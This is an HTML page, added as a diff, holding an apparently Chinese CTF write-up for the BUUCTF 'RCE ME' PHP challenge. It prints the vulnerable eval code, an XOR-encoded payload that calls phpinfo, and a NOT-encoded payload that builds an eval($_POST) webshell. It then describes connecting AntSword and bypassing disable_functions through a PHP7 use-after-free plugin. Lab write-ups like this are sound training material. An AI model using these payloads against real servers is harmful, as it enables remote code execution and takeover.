@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>2019极客大挑战 // main1o</title>
+    <link rel="shortcut icon" href="pochita.png" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.114.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="2019极客大挑战"/>
+<meta name="twitter:description" content="[极客大挑战 2019]RCE ME 在线环境BUUCTF搜索
+&lt;?php error_reporting(0); if(isset($_GET[&#39;code&#39;])){ $code=$_GET[&#39;code&#39;]; if(strlen($code)&gt;40){ die(&#34;This is too Long.&#34;); } if(preg_match(&#34;/[A-Za-z0-9]&#43;/&#34;,$code)){ die(&#34;NO.&#34;); } @eval($code); } else{ highlight_file(__FILE__); } // ?&gt; 分析代码知道传入的值不能是A-Z,a-z,0-9并且不能大于40个字符
+?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo // 这里进行异或绕过了 // 被解析为：${_GET}{%ff}();&amp;%ff=phpinfo	再次构建payload
+&lt;?php error_reporting(0); $a=&#39;assert&#39;; $b=urlencode(~$a); echo $b; echo &#34;&lt;br&gt;&#34;; $c=&#39;(eval($_POST[a]))&#39;; $d=urlencode(~$c); echo $d; %9E%8C%8C%9A%8D%8B %D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6 // 传值得取反 code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6); 用web工具连接，蚁剑 在之前的phpinfo能看到很多函数被禁用了，蚁剑不能调用终端，所以得开代理下载一个蚁剑插件，在插件市场里，下载disable_functions的插件 然后在webshell连接页面，启用插件，选择模式 PHP7的UAF
+在根目录看见readflag，运行的得到flag～"/>
+
+    <meta property="og:title" content="2019极客大挑战" />
+<meta property="og:description" content="[极客大挑战 2019]RCE ME 在线环境BUUCTF搜索
+&lt;?php error_reporting(0); if(isset($_GET[&#39;code&#39;])){ $code=$_GET[&#39;code&#39;]; if(strlen($code)&gt;40){ die(&#34;This is too Long.&#34;); } if(preg_match(&#34;/[A-Za-z0-9]&#43;/&#34;,$code)){ die(&#34;NO.&#34;); } @eval($code); } else{ highlight_file(__FILE__); } // ?&gt; 分析代码知道传入的值不能是A-Z,a-z,0-9并且不能大于40个字符
+?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo // 这里进行异或绕过了 // 被解析为：${_GET}{%ff}();&amp;%ff=phpinfo	再次构建payload
+&lt;?php error_reporting(0); $a=&#39;assert&#39;; $b=urlencode(~$a); echo $b; echo &#34;&lt;br&gt;&#34;; $c=&#39;(eval($_POST[a]))&#39;; $d=urlencode(~$c); echo $d; %9E%8C%8C%9A%8D%8B %D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6 // 传值得取反 code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6); 用web工具连接，蚁剑 在之前的phpinfo能看到很多函数被禁用了，蚁剑不能调用终端，所以得开代理下载一个蚁剑插件，在插件市场里，下载disable_functions的插件 然后在webshell连接页面，启用插件，选择模式 PHP7的UAF
+在根目录看见readflag，运行的得到flag～" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://main1o.github.io/post/2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-09-09T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-09-09T00:00:00+00:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://main1o.github.io/"><img class="app-header-avatar" src="/avatar.png" alt="John Doe" /></a>
+      <span class="app-header-title">main1o</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+            -
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+            -
+          
+          <a class="app-header-menu-item" href="/links/">Links</a>
+            -
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>荆棘之路</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">2019极客大挑战</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Sep 9, 2021
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          1 min read
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://main1o.github.io/tags/php/">php</a>
+              <a class="tag" href="https://main1o.github.io/tags/ctf/">ctf</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="极客大挑战-2019rce-me">[极客大挑战 2019]RCE ME</h1>
+<p>在线环境BUUCTF搜索</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;code&#39;</span>])){
+</span></span><span style="display:flex;"><span>            $code<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;code&#39;</span>];
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($code)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">40</span>){
+</span></span><span style="display:flex;"><span>                                        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;This is too Long.&#34;</span>);
+</span></span><span style="display:flex;"><span>                                                }
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/[A-Za-z0-9]+/&#34;</span>,$code)){
+</span></span><span style="display:flex;"><span>                                        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;NO.&#34;</span>);
+</span></span><span style="display:flex;"><span>                                                }
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($code);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ?&gt;
+</span></span></span></code></pre></div><p>分析代码知道传入的值不能是<code>A-Z,a-z,0-9</code>并且不能大于40个字符</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#a6e22e">code</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">$</span>{<span style="color:#f92672">%</span><span style="color:#a6e22e">ff</span><span style="color:#f92672">%</span><span style="color:#a6e22e">ff</span><span style="color:#f92672">%</span><span style="color:#a6e22e">ff</span><span style="color:#f92672">%</span><span style="color:#a6e22e">ff</span><span style="color:#f92672">^%</span><span style="color:#a6e22e">a0</span><span style="color:#f92672">%</span><span style="color:#a6e22e">b8</span><span style="color:#f92672">%</span><span style="color:#a6e22e">ba</span><span style="color:#f92672">%</span><span style="color:#a6e22e">ab</span>}{<span style="color:#f92672">%</span><span style="color:#a6e22e">ff</span>}();<span style="color:#f92672">&amp;%</span><span style="color:#a6e22e">ff</span><span style="color:#f92672">=</span><span style="color:#a6e22e">phpinfo</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 这里进行异或绕过了
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 被解析为：${_GET}{%ff}();&amp;%ff=phpinfo	  
+</span></span></span></code></pre></div><p>再次构建payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>$a<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;assert&#39;</span>;
+</span></span><span style="display:flex;"><span>$b<span style="color:#f92672">=</span><span style="color:#a6e22e">urlencode</span>(<span style="color:#f92672">~</span>$a);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $b;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>$c<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;(eval($_POST[a]))&#39;</span>;
+</span></span><span style="display:flex;"><span>$d<span style="color:#f92672">=</span><span style="color:#a6e22e">urlencode</span>(<span style="color:#f92672">~</span>$c);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $d;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">E</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">C</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">C</span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">B</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">D7</span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">89</span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">E</span><span style="color:#f92672">%</span><span style="color:#ae81ff">93</span><span style="color:#f92672">%</span><span style="color:#a6e22e">D7</span><span style="color:#f92672">%</span><span style="color:#a6e22e">DB</span><span style="color:#f92672">%</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#a6e22e">AF</span><span style="color:#f92672">%</span><span style="color:#a6e22e">B0</span><span style="color:#f92672">%</span><span style="color:#a6e22e">AC</span><span style="color:#f92672">%</span><span style="color:#a6e22e">AB</span><span style="color:#f92672">%</span><span style="color:#a6e22e">A4</span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">E</span><span style="color:#f92672">%</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#a6e22e">D6</span><span style="color:#f92672">%</span><span style="color:#a6e22e">D6</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 传值得取反
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">code</span><span style="color:#f92672">=</span>(<span style="color:#f92672">~%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">E</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">C</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">C</span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">B</span>)(<span style="color:#f92672">~%</span><span style="color:#a6e22e">D7</span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">89</span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">E</span><span style="color:#f92672">%</span><span style="color:#ae81ff">93</span><span style="color:#f92672">%</span><span style="color:#a6e22e">D7</span><span style="color:#f92672">%</span><span style="color:#a6e22e">DB</span><span style="color:#f92672">%</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#a6e22e">AF</span><span style="color:#f92672">%</span><span style="color:#a6e22e">B0</span><span style="color:#f92672">%</span><span style="color:#a6e22e">AC</span><span style="color:#f92672">%</span><span style="color:#a6e22e">AB</span><span style="color:#f92672">%</span><span style="color:#a6e22e">A4</span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">E</span><span style="color:#f92672">%</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#a6e22e">D6</span><span style="color:#f92672">%</span><span style="color:#a6e22e">D6</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">用web工具连接，蚁剑</span>
+</span></span></code></pre></div><p>在之前的phpinfo能看到很多函数被禁用了，蚁剑不能调用终端，所以得开代理下载一个蚁剑插件，在插件市场里，下载<code>disable_functions的插件</code>
+然后在<code>webshell</code>连接页面，启用插件，选择模式 <code>PHP7的UAF</code></p>
+<p>在根目录看见readflag，运行的得到flag～</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
